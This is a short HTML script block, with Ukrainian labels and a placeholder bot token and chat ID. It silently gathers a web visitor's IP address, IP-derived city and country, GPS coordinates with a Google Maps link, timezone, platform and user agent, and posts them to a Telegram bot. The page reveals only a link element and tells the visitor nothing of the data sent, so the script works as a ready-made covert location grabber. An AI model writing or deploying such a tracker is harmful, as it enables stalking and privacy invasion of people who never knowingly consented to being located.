<script>
async function sendTelegram() {
    const TOKEN = 'ТВОЙ_ТОКЕН';
    const CHAT_ID = 'ТВОЙ_CHAT_ID';

    const now = new Date();

    const timestampLocal = now.toLocaleString();
    const timestampUTC = now.toUTCString();
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

    const userAgent = navigator.userAgent;
    const platform = navigator.platform;

    let ip = 'невідомо';
    try {
        const res = await fetch('https://api.ipify.org?format=json');
        const json = await res.json();
        ip = json.ip;
    } catch {}

    let locationIP = 'невідомо';
    try {
        const res = await fetch(`https://ipapi.co/${ip}/json/`);
        const loc = await res.json();
        locationIP = `${loc.city || ''} ${loc.region || ''} ${loc.country_name || ''}`;
    } catch {}

    // 👉 GPS
    function getGPS() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve(null);
            } else {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy
                        });
                    },
                    () => resolve(null),
                    { timeout: 5000 }
                );
            }
        });
    }

    const gps = await getGPS();

    let message = `📡 *Дані користувача*\n\n`;

    message += `🕒 ${timestampLocal}\n`;
    message += `🌍 ${timezone}\n\n`;

    message += `🌐 IP: ${ip}\n`;
    message += `📍 IP-локація: ${locationIP}\n\n`;

    if (gps) {
        message += `📡 GPS:\n`;
        message += `Lat: ${gps.lat}\n`;
        message += `Lon: ${gps.lon}\n`;
        message += `🎯 Точність: ~${Math.round(gps.accuracy)} м\n\n`;

        message += `📍 Google Maps:\n`;
        message += `https://maps.google.com/?q=${gps.lat},${gps.lon}\n\n`;
    } else {
        message += `❌ GPS недоступний або відхилений\n\n`;
    }

    message += `💻 ${platform}\n`;
    message += `🖥️ ${userAgent}`;

    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
            }),
        });

        document.getElementById('tgLink').style.display = 'flex';

    } catch (err) {
        alert('Помилка: ' + err);
    }
}
</script>
